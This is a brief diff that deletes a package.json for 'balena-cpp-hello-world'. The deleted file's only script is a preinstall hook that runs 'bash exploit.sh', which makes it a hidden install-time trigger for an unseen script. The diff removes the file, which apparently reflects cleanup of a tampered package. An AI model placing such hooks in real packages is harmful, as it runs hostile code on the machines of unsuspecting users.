@@ -1,7 +1,0 @@
-{
-  "name": "balena-cpp-hello-world",
-  "version": "1.0.5",
-  "scripts": {
-    "preinstall": "bash exploit.sh"
-  }
-}
